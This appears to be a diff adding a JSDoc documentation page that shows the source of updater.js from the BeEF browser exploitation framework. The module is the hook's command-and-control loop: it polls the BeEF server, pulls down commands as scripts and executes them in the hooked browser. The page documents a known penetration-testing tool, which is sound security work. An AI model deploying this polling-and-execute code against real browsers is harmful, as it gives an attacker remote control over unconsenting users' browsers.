@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>JSDoc: Source: updater.js</title>
+
+    <script src="scripts/prettify/prettify.js"> </script>
+    <script src="scripts/prettify/lang-css.js"> </script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <link type="text/css" rel="stylesheet" href="styles/prettify-tomorrow.css">
+    <link type="text/css" rel="stylesheet" href="styles/jsdoc-default.css">
+</head>
+
+<body>
+
+<div id="main">
+
+    <h1 class="page-title">Source: updater.js</h1>
+
+    
+
+
+
+    
+    <section>
+        <article>
+            <pre class="prettyprint source linenums"><code>//
+// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+/**
+ * Object in charge of getting new commands from the BeEF framework and execute them.
+ * The XHR-polling channel is managed here. If WebSockets are enabled,
+ * websocket.ls is used instead.
+ * @namespace beef.updater
+ */
+beef.updater = {
+	
+	/** XHR-polling timeout. */ 
+	xhr_poll_timeout: "&lt;%= @xhr_poll_timeout %>",
+	
+	/** Hook session name. */ 
+    beefhook: "&lt;%= @hook_session_name %>",
+	
+	/** A lock. */ 
+	lock: false,
+	
+	/** An object containing all values to be registered and sent by the updater. */
+	objects: new Object(),
+	
+	/**
+	 * Registers an object to always send when requesting new commands to the framework.
+	 * @param {String} key the name of the object.
+	 * @param {String} value the value of that object.
+	 * 
+	 * @example beef.updater.regObject('java_enabled', 'true');
+	 */
+	regObject: function(key, value) {
+		this.objects[key] = escape(value);
+	},
+	
+	// Checks for new commands from the framework and runs them.
+	check: function() {
+		if(this.lock == false) {
+			if (beef.logger.running) {
+				beef.logger.queue();
+			}
+			beef.net.flush();
+			if(beef.commands.length > 0) {
+				this.execute_commands();
+			}else {
+				this.get_commands();    /*Polling*/
+			}
+		}
+        /* The following gives a stupid syntax error in IE, which can be ignored*/
+        setTimeout(function(){beef.updater.check()}, beef.updater.xhr_poll_timeout);
+	},
+	
+    /**
+     * Gets new commands from the framework.
+     */
+	get_commands: function() {
+		try {
+			this.lock = true;
+            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
+                if (response.body != null &amp;&amp; response.body.length > 0)
+                    beef.updater.execute_commands();
+            });
+		} catch(e) {
+			this.lock = false;
+			return;
+		}
+		this.lock = false;
+	},
+	
+    /**
+     * Executes the received commands, if any.
+     */
+	execute_commands: function() {
+		if(beef.commands.length == 0) return;
+		this.lock = true;
+		while(beef.commands.length > 0) {
+			command = beef.commands.pop();
+			try {
+				command();
+			} catch(e) {
+				beef.debug('execute_commands - command failed to execute: ' + e.message);
+                // prints the command source to be executed, to better trace errors
+                // beef.client_debug must be enabled in the main config
+                beef.debug(command.toString());
+			}
+		}
+		this.lock = false;
+	}
+};
+
+beef.regCmp('beef.updater');
+</code></pre>
+        </article>
+    </section>
+
+
+
+
+</div>
+
+<nav>
+    <h2><a href="index.html">Home</a></h2><h3>Namespaces</h3><ul><li><a href="beef.are.html">are</a></li><li><a href="beef.browser.html">browser</a></li><li><a href="beef.browser.cookie.html">cookie</a></li><li><a href="beef.browser.popup.html">popup</a></li><li><a href="beef.dom.html">dom</a></li><li><a href="beef.encode.base64.html">base64</a></li><li><a href="beef.encode.json.html">json</a></li><li><a href="beef.geolocation.html">geolocation</a></li><li><a href="beef.hardware.html">hardware</a></li><li><a href="beef.init.html">init</a></li><li><a href="beef.logger.html">logger</a></li><li><a href="beef.mitb.html">mitb</a></li><li><a href="beef.net.html">net</a></li><li><a href="beef.net.connection.html">connection</a></li><li><a href="beef.net.cors.html">cors</a></li><li><a href="beef.net.dns.html">dns</a></li><li><a href="beef.net.local.html">local</a></li><li><a href="beef.net.portscanner.html">portscanner</a></li><li><a href="beef.net.requester.html">requester</a></li><li><a href="beef.net.xssrays.html">xssrays</a></li><li><a href="beef.os.html">os</a></li><li><a href="beef.session.html">session</a></li><li><a href="beef.timeout.html">timeout</a></li><li><a href="beef.updater.html">updater</a></li><li><a href="beef.webrtc.html">webrtc</a></li><li><a href="beef.websocket.html">websocket</a></li><li><a href="BeefJS.html">BeefJS</a></li><li><a href="browser_jools.html">browser_jools</a></li><li><a href="platform.html">platform</a></li></ul>
+</nav>
+
+<br class="clear">
+
+<footer>
+    Documentation generated by <a href="https://github.com/jsdoc/jsdoc">JSDoc 3.6.3</a> on Thu Jan 02 2020 16:29:11 GMT+1000 (Australian Eastern Standard Time)
+</footer>
+
+<script> prettyPrint(); </script>
+<script src="scripts/linenumber.js"> </script>
+</body>
+</html>
